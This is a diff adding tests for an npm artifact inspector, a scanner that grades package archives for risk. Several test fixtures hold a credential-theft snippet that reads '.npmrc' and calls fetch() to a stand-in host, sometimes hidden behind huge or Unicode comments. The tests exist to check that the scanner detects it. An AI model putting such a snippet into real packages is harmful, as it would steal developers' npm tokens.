@@ -63,7 +63,8 @@ test('unsupported links and bounded source limits prevent a clean claim', async 
   const native = archive([packageEntry(), { name: 'package/native.node', body: 'not scanned' }]);
   assert.equal(inspectNpmArtifact(native).risk, 'incomplete');
   const bin = archive([{ name: 'package/package.json', body: JSON.stringify({ name: 'fixture', version: '1.0.0', bin: './bin/tool' }) }, { name: 'package/bin/tool', body: '#!/usr/bin/env node\nconsole.log(1)' }]);
-  assert.equal(inspectNpmArtifact(bin).risk, 'incomplete');
+  assert.equal(inspectNpmArtifact(bin).risk, 'none');
+  assert.equal(inspectNpmArtifact(bin).sourceFiles, 1);
   const shell = archive([packageEntry(), { name: 'package/install.sh', body: 'echo fixture' }]);
   assert.equal(inspectNpmArtifact(shell).risk, 'incomplete');
   const wildcard = archive([{ name: 'package/package.json', body: JSON.stringify({ name: 'fixture', version: '1.0.0', exports: { './*': './lib/*' } }) }, { name: 'package/lib/one.js', body: 'export const one = 1;' }]);
@@ -158,4 +159,66 @@ test('root-directory compatibility never admits payloads, links or outside paths
   for (const entry of [{name:'package',type:'0',body:'x'},{name:'package',type:'2'},{name:'package',type:'5',body:'x'},{name:'package/',type:'5',body:'x'},{name:'package/',type:'0',body:'x'},{name:'package/',type:'2'},{name:'other',type:'5'},{name:'package/../',type:'5'}]) {
     assert.throws(()=>inspectNpmArtifact(archive([entry,packageEntry()])),/outside package|Unsafe/);
   }
+});
+
+test('large source inspection preserves malicious tail detection and separate manifest bounds', async () => {
+  const { inspectNpmArtifact } = await import('../src/npm-artifact-inspector.js');
+  const padding='/*'+ 'x'.repeat(2*1024*1024) +'😀*/\n';
+  const bytes=archive([packageEntry(),{name:'package/large.js',body:padding+"fs.readFileSync('.npmrc'); fetch('https://example.test');"}]);
+  const report=inspectNpmArtifact(bytes);
+  assert.equal(report.risk,'high');assert.equal(report.sourceFiles,1);
+  const largeManifest=archive([{name:'package/package.json',body:JSON.stringify({...manifest(),description:'x'.repeat(1024*1024)})}]);
+  assert.throws(()=>inspectNpmArtifact(largeManifest),/oversized package manifest/);
+});
+
+test('source limits remain incomplete above eight MiB per file or twelve MiB aggregate',async()=>{
+ const {inspectNpmArtifact}=await import('../src/npm-artifact-inspector.js');
+ const single=archive([packageEntry(),{name:'package/large.js',body:' '.repeat(8*1024*1024+1)}]);
+ assert.equal(inspectNpmArtifact(single).risk,'incomplete');
+ const aggregate=archive([packageEntry(),...['one','two'].map(name=>({name:'package/'+name+'.js',body:' '.repeat(6*1024*1024+1)}))]);
+ assert.equal(inspectNpmArtifact(aggregate).risk,'incomplete');
+});
+
+test('Unicode comments cannot hide executable code following the comment',async()=>{
+ const {inspectNpmArtifact}=await import('../src/npm-artifact-inspector.js');
+ const body='/*'+'😀'.repeat(5000)+'*/\n'+"fs.readFileSync('.npmrc'); fetch('https://example.test');";
+ assert.equal(inspectNpmArtifact(archive([packageEntry(),{name:'package/x.js',body}])).risk,'high');
+});
+
+test('registry identity permits a consistent package basename root, never arbitrary or mixed roots',async()=>{
+ const {inspectNpmArtifact}=await import('../src/npm-artifact-inspector.js');
+ const entry={name:'node/package.json',body:JSON.stringify({name:'@types/node',version:'1.0.0'})};
+ const limits={expectName:'@types/node',expectVersion:'1.0.0'};
+ const entries=[{name:'node',type:'5'},entry,{name:'node/index.d.ts',body:'export declare const x: string;'}];
+ assert.equal(inspectNpmArtifact(archive(entries),limits).risk,'none');
+ for(const extra of [{name:'package/x.js',body:'x'},{name:'node/../../escape.js',body:'x'},{name:'other/x.js',body:'x'},{name:'node',type:'2'}])assert.throws(()=>inspectNpmArtifact(archive([...entries,extra]),limits),/root|outside|Unsafe/);
+ assert.throws(()=>inspectNpmArtifact(archive(entries)),/root|outside/);
+ assert.throws(()=>inspectNpmArtifact(archive(entries),{...limits,expectName:'other'}),/root|outside/);
+});
+
+test('legacy main resolves a JavaScript extension while exports and missing entries stay strict',async()=>{
+ const {inspectNpmArtifact}=await import('../src/npm-artifact-inspector.js');
+ const inspect=manifest=>inspectNpmArtifact(archive([{name:'package/package.json',body:JSON.stringify({name:'fixture',version:'1.0.0',...manifest})},{name:'package/dist/entry.js',body:'module.exports=1;'}]));
+ assert.equal(inspect({main:'dist/entry'}).risk,'none');
+ assert.equal(inspect({main:'dist/missing'}).risk,'incomplete');
+ assert.equal(inspect({exports:'./dist/entry'}).risk,'incomplete');
+ assert.equal(inspect({main:'dist/entry',exports:'./dist/entry'}).risk,'incomplete');
+});
+
+test('extensionless approved Node scripts receive full inspection with unchanged coverage limits',async()=>{
+ const {inspectNpmArtifact}=await import('../src/npm-artifact-inspector.js');
+ const scan=(body,limits={})=>inspectNpmArtifact(archive([{name:'package/package.json',body:JSON.stringify({...manifest(),bin:'bin/tool'})},{name:'package/bin/tool',body}]),limits);
+ assert.equal(scan('#!/usr/bin/env node\nconsole.log(1);').risk,'none');
+ assert.equal(scan("#!/usr/bin/env node\nfs.readFileSync('.npmrc'); fetch('https://example.test');").risk,'high');
+ for(const header of ['#!/bin/sh','#!/usr/bin/env node --eval','#!/usr/bin/env python'])assert.equal(scan(header+'\nconsole.log(1)').risk,'incomplete');
+ assert.equal(scan('#!/usr/bin/env node\n'+ 'x'.repeat(100),{textFile:80}).risk,'incomplete');
+ assert.equal(scan('#!/usr/bin/env node\n\u0000').risk,'incomplete');
+});
+
+test('only missing types-only declaration exports are informational, including shared-path ordering',async()=>{
+ const {inspectNpmArtifact}=await import('../src/npm-artifact-inspector.js');
+ const scan=exports=>inspectNpmArtifact(archive([{name:'package/package.json',body:JSON.stringify({...manifest(),exports})}]));
+ const metadata=scan({types:'./missing.d.ts'});assert.equal(metadata.risk,'none');assert.equal(metadata.findings[0].severity,'info');
+ assert.equal(scan({types:'./missing.js'}).risk,'incomplete');
+ for(const exports of [{types:'./missing.d.ts',import:'./missing.d.ts'},{import:'./missing.d.ts',types:'./missing.d.ts'}])assert.equal(scan(exports).risk,'incomplete');
 });
